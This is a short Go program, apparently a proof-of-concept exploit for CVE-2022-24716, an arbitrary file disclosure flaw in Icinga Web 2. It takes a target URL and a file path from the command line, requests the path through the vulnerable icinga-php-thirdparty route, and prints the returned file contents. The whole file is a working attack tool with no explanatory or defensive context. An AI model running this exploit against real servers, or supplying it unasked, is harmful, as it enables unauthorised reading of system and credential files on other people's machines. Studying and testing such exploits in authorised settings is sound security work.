package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"

	"github.com/akamensky/argparse"
)

func main() {
	Argumentos()
}

func lfi(url string, path string) {
	resposta, _ := http.Get(url + "/icingaweb2/lib/icinga/icinga-php-thirdparty" + path)
	lfi, _ := ioutil.ReadAll(resposta.Body)
	fmt.Println(string(lfi))
}

func Argumentos() {
	parser := argparse.NewParser("CVE-2022-24716", "CVE-2022-24716 - Arbitrary File Disclosure")
	var url *string = parser.String("u", "url", &argparse.Options{Required: true, Help: "Insert url", Default: ""})
	var path *string = parser.String("p", "path", &argparse.Options{Required: true, Help: "Insert path", Default: ""})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Println(parser.Usage(err))
		return
	}
	lfi(*url, *path)

}
